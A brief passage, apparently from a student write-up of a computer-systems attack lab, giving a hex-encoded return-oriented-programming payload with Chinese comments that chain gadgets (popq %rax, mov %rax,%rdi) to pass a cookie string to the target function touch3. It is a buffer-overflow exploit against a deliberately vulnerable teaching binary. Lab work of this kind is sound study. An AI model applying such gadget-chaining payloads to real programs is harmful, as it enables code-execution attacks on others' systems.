...
```
00 00 00 00 00 00 00 00  # 此处是 0x5561dc78
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  # 占位
ab 19 40 00 00 00 00 00  # 指向指令: popq %rax
c0 dc 61 55 00 00 00 00  # 字符串开始的地址
a2 19 40 00 00 00 00 00  # 指向指令: mov %rax, %rdi
fa 18 40 00 00 00 00 00  # 指向touch3
35 39 62 39 39 37 66 61  # 此处是 0x5561dcc0
```
